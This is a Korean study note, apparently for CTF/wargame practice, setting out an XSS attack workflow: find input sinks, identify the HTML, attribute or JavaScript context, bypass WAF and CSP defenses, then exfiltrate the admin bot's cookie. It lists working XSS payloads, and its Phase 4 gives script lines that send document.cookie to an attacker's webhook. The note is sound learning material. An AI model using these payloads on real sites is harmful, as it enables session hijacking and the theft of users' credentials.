
[[Web Hacking Entry Point#**Phase 2 탐침 던지기 (무엇으로 반응을 볼 것인가?)**]]

## Phase 1: 취약점 탐색 (Reconnaissance & Sink Identification)
가장 먼저 "내가 입력한 값이 어디서, 어떻게 출력되는가?"를 찾는다.

* **Source (입력구):** URL 파라미터, 게시판 본문, 프로필 이름, 파일 업로드 이름 등
* **Sink (출력구):** 내 입력값이 화면에 렌더링되는 지점.
* **🚨 핵심 체크리스트:**
    * HTML 태그가 먹히는가? (`<h1>test</h1>` 입력 후 글자가 커지는지 확인)
    * 서버 코드(Python)에 `{{ content | safe }}` 가 있는가? ➡️ **[XSS 확정]** Auto-Escaping이 거세된 상태임.
    * JS 코드 내부에 내 입력값이 들어가는가? (예: `<script>var name = "내입력값";</script>`)

## Phase 2: Context 분석 (지형 파악)
내 입력값이 어느 '구역'에 떨어졌는지 파악한다. 구역에 따라 쓸 수 있는 무기가 완전히 다르다!

1.  **HTML Context:** `<div> 내입력값 </div>`
    * **전략:** 새로운 태그를 열어버린다. `<script>alert(1)</script>` 또는 `<img src=x onerror=alert(1)>`
2.  **Attribute Context:** `<input value="내입력값">`
    * **전략:** 따옴표를 닫고 빠져나온다. `"><script>alert(1)</script>` 또는 `" autofocus onfocus="alert(1)`
3.  **JavaScript Context:** `<script>var a = "내입력값";</script>`
    * **전략:** 따옴표를 닫고 JS 코드를 주입한다. `"; alert(1); //`

## Phase 3: 방어선 식별 및 우회 (Defense Evasion)
단순한 `alert(1)`이 막혔을 때, 적의 방패가 무엇인지 파악한다.

* **WAF / 블랙리스트 필터링:** `script`, `onerror` 등의 단어나 `<` 같은 특수문자를 막음. 
    * [[XSS WAF Bypass]]
* **CSP (Content Security Policy):** `script-src` 속성 등으로 허가되지 않은 스크립트 실행을 원천 차단. (콘솔에 빨간 에러 뜸)
    * 👉 **[Action]:** `nonce`가 있는지, `self`가 있는지, `base-uri`가 뚫려 있는지 서버 헤더를 분석한다.

## Phase 4: 플래그 탈취 (Weaponization & Exfiltration)
`alert(1)` 띄우기는 장난이다. 워게임의 최종 목표는 **'관리자 봇의 쿠키(Flag)'**를 훔치는 것이다.

* **준비물:** 내 요청을 받을 개인 서버 (GitHub Pages, Request Bin, Webhook 등)
* **타격 페이로드 (SOP 우회 포함):**
    ```html
    <script>location.href="https://내웹훅주소/?cookie="+document.cookie;</script>

    <script>new Image().src="https://내웹훅주소/?cookie="+document.cookie;</script>
    ```
* **봇 호출 (Trigger):** 페이로드를 심은 게시글의 URL을 Report 페이지를 통해 봇에게 전송한다.